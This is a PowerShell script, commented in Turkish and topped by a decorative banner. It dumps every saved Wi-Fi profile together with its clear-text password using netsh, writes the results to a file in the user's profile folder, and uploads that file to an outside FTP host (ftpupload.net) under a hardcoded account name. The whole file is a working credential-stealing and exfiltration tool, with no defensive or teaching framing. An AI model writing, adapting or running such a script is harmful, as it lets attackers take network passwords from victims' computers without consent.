# Konsol encoding'i UTF-8 yap
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# Banner
$banner = @"
██████╗░██╗░░░██╗██╗░░░░░███████╗███╗░░██╗████████╗  
██╔══██╗██║░░░██║██║░░░░░██╔════╝████╗░██║╚══██╔══╝  
██████╦╝██║░░░██║██║░░░░░█████╗░░██╔██╗██║░░░██║░░░  
██╔══██╗██║░░░██║██║░░░░░██╔══╝░░██║╚████║░░░██║░░░  
██████╦╝╚██████╔╝███████╗███████╗██║░╚███║░░░██║░░░  
╚═════╝░░╚═════╝░╚══════╝╚══════╝╚═╝░░╚══╝░░░╚═╝░░░  

███████╗██╗░██████╗████████╗██╗░██████╗░██╗
██╔════╝██║██╔════╝╚══██╔══╝██║██╔════╝░██║
█████╗░░██║╚█████╗░░░░██║░░░██║██║░░██╗░██║
██╔══╝░░██║░╚═══██╗░░░██║░░░██║██║░░╚██╗██║
██║░░░░░██║██████╔╝░░░██║░░░██║╚██████╔╝██║
╚═╝░░░░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░╚═════╝░╚═╝
"@

Write-Host $banner -ForegroundColor Cyan

# Türkçe karakter testi
Write-Host "Türkçe karakterler: ğüşöçİı" -ForegroundColor Yellow

$ftpUser = "if0_39536575"
$ftpPass = $env:FTP_PASS

if (-not $ftpPass) {
    Write-Error "FTP_PASS ortam degiskeni ayarli degil!"
    exit 1
}

$localFile = "$env:USERPROFILE\wifipass.txt"

# Eski dosya varsa sil
Remove-Item -Path $localFile -ErrorAction SilentlyContinue

# Bütün Wi-Fi profillerini al
$profiles = netsh wlan show profiles | ForEach-Object {
    if ($_ -match ":\s(.+)$") {
        $matches[1].Trim()
    }
}

# Her profil için detay al
foreach ($profile in $profiles) {
    Add-Content -Path $localFile -Value "=== $profile ===`n"

    $profileDetail = netsh wlan show profile name="$profile" key=clear
    Add-Content -Path $localFile -Value $profileDetail
    Add-Content -Path $localFile -Value "`n`n"
}


$ftpUrl = "ftp://ftpupload.net/wifipass.txt"

$webclient = New-Object System.Net.WebClient
$webclient.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPass)

try {
    $webclient.UploadFile($ftpUrl, "STOR", $localFile)
    Write-Host "Dosya basariyla FTP sistemine yuklendi."
}
catch {
    Write-Host "Hata olustu: $_"
}
